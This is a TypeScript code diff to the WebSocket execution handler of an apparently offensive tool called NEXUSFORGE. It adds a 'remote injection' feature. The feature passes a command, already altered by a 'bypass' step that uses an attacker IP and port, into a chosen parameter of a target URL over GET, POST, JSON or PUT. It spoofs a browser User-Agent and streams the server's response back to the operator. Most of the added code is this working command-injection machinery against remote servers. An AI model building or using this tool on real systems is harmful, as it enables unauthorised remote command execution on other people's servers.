@@ -12,12 +12,128 @@ interface ExecRequest {
   engine?: string;
   mode?: string;
   target?: string;
+  injectionUrl?: string;
+  injectParam?: string;
+  httpMethod?: string;
+  customHeaders?: string;
   attackerIp?: string;
   attackerPort?: string;
 }
 
 function send(ws: WebSocket, obj: unknown): void {
   if (ws.readyState === 1) ws.send(JSON.stringify(obj));
+}
+
+async function handleRemoteInject(
+  ws: WebSocket,
+  injectionUrl: string,
+  injectParam: string,
+  httpMethod: string,
+  customHeaders: string,
+  payload: string,
+  start: number,
+  originalCmd: string,
+  engine: string,
+  mode: string
+): Promise<void> {
+  let parsedUrl: URL;
+  try {
+    parsedUrl = new URL(injectionUrl);
+  } catch {
+    send(ws, { type: "error", message: `Invalid injection URL: ${injectionUrl}` });
+    ws.close();
+    return;
+  }
+
+  const method = (httpMethod || "GET").toUpperCase();
+  const param  = injectParam || "cmd";
+
+  const baseHeaders: Record<string, string> = {
+    "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Connection":      "close",
+  };
+
+  if (customHeaders.trim()) {
+    for (const line of customHeaders.split(/\r?\n/)) {
+      const sep = line.indexOf(":");
+      if (sep > 0) {
+        const k = line.slice(0, sep).trim();
+        const v = line.slice(sep + 1).trim();
+        if (k) baseHeaders[k] = v;
+      }
+    }
+  }
+
+  send(ws, { type: "data", chunk: `[NEXUSFORGE] Remote Injection\n` });
+  send(ws, { type: "data", chunk: `[TARGET]     ${parsedUrl.toString()}\n` });
+  send(ws, { type: "data", chunk: `[METHOD]     ${method}\n` });
+  send(ws, { type: "data", chunk: `[PARAMETER]  ${param}\n` });
+  send(ws, { type: "data", chunk: `[PAYLOAD]    ${payload.slice(0, 120)}${payload.length > 120 ? "…" : ""}\n` });
+  send(ws, { type: "data", chunk: `─────────────────────────────────────────────────────\n\n` });
+
+  try {
+    let response: Response;
+
+    if (method === "GET") {
+      parsedUrl.searchParams.set(param, payload);
+      response = await fetch(parsedUrl.toString(), {
+        method: "GET",
+        headers: baseHeaders,
+        signal: AbortSignal.timeout(30000),
+      });
+    } else if (method === "POST") {
+      const body = new URLSearchParams({ [param]: payload });
+      baseHeaders["Content-Type"] = "application/x-www-form-urlencoded";
+      response = await fetch(parsedUrl.toString(), {
+        method: "POST",
+        headers: baseHeaders,
+        body: body.toString(),
+        signal: AbortSignal.timeout(30000),
+      });
+    } else if (method === "JSON") {
+      baseHeaders["Content-Type"] = "application/json";
+      response = await fetch(parsedUrl.toString(), {
+        method: "POST",
+        headers: baseHeaders,
+        body: JSON.stringify({ [param]: payload }),
+        signal: AbortSignal.timeout(30000),
+      });
+    } else if (method === "PUT") {
+      baseHeaders["Content-Type"] = "application/x-www-form-urlencoded";
+      response = await fetch(parsedUrl.toString(), {
+        method: "PUT",
+        headers: baseHeaders,
+        body: new URLSearchParams({ [param]: payload }).toString(),
+        signal: AbortSignal.timeout(30000),
+      });
+    } else {
+      send(ws, { type: "error", message: `Unsupported method: ${method}` });
+      ws.close();
+      return;
+    }
+
+    const statusLine = `HTTP/${response.status} ${response.statusText}`;
+    send(ws, { type: "data", chunk: `${statusLine}\n` });
+    response.headers.forEach((val, key) => {
+      send(ws, { type: "data", chunk: `${key}: ${val}\n` });
+    });
+    send(ws, { type: "data", chunk: `\n` });
+
+    const text = await response.text();
+    send(ws, { type: "data", chunk: text });
+
+    const elapsed = Date.now() - start;
+    logInjection(originalCmd, `remote/${method.toLowerCase()}`, mode, elapsed);
+    send(ws, { type: "end", code: response.ok ? 0 : 1, elapsed });
+    ws.close();
+  } catch (err: unknown) {
+    const msg = (err as Error).message ?? String(err);
+    send(ws, { type: "error", message: `Remote injection failed: ${msg}` });
+    logInjection(originalCmd, engine, mode, Date.now() - start);
+    if (ws.readyState === 1) ws.close();
+  }
 }
 
 function buildSpawnTarget(
@@ -113,8 +229,8 @@ function buildSpawnTarget(
         file: "",
         args: [],
         precompile: () => {
-          const tmp = mkdtempSync(join(tmpdir(), "nxc-"));
-          const bin = `${tmp}/nexus_bin`;
+          const tmp  = mkdtempSync(join(tmpdir(), "nxc-"));
+          const bin  = `${tmp}/nexus_bin`;
           writeFileSync(`${tmp}/nexus.c`, src);
           execSync(`gcc ${tmp}/nexus.c -o ${bin}`, { timeout: 15000, stdio: "ignore" });
           return { file: bin, args: [] };
@@ -139,11 +255,15 @@ export function handleStreamExec(ws: WebSocket): void {
     }
 
     const {
-      cmd        = "",
-      engine     = "bash/bash",
-      mode       = "classic",
-      target     = "target",
-      attackerIp = "127.0.0.1",
+      cmd          = "",
+      engine       = "bash/bash",
+      mode         = "classic",
+      target       = "target",
+      injectionUrl = "",
+      injectParam  = "cmd",
+      httpMethod   = "GET",
+      customHeaders = "",
+      attackerIp   = "127.0.0.1",
       attackerPort = "4444",
     } = req;
 
@@ -155,23 +275,32 @@ export function handleStreamExec(ws: WebSocket): void {
 
     const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
     const start = Date.now();
+
+    if (injectionUrl.trim()) {
+      logger.info({ injectionUrl, method: httpMethod, param: injectParam, mode }, "ws/exec remote");
+      void handleRemoteInject(
+        ws, injectionUrl.trim(), injectParam, httpMethod,
+        customHeaders, processed, start, cmd, engine, mode
+      );
+      return;
+    }
+
+    logger.info({ engine, mode, target }, "ws/exec local");
+
     const [lang] = engine.split("/");
-
     let spawnConfig: { file: string; args: string[] };
-
     const descriptor = buildSpawnTarget(processed, engine);
+
     if (descriptor.precompile) {
       try {
         spawnConfig = descriptor.precompile();
       } catch {
-        send(ws, { type: "data", chunk: `[${lang.toUpperCase()} compiler unavailable — shell fallback]\n` });
+        send(ws, { type: "data", chunk: `[${lang?.toUpperCase()} compiler unavailable — shell fallback]\n` });
         spawnConfig = { file: "/bin/bash", args: ["-c", processed] };
       }
     } else {
       spawnConfig = { file: descriptor.file, args: descriptor.args };
     }
-
-    logger.info({ engine, mode, target }, "ws/exec");
 
     const runSpawn = (file: string, args: string[]) => {
       const child = spawn(file, args, {
@@ -188,7 +317,7 @@ export function handleStreamExec(ws: WebSocket): void {
       });
 
       const killTimer = setTimeout(() => {
-        try { child.kill("SIGTERM"); } catch { /* already dead */ }
+        try { child.kill("SIGTERM"); } catch { /* ignore */ }
         send(ws, { type: "data", chunk: "\n[TIMEOUT — 30s]\n" });
       }, 30000);
 
@@ -214,7 +343,7 @@ export function handleStreamExec(ws: WebSocket): void {
 
       ws.on("close", () => {
         clearTimeout(killTimer);
-        try { child.kill("SIGTERM"); } catch { /* already dead */ }
+        try { child.kill("SIGTERM"); } catch { /* ignore */ }
       });
     };
 
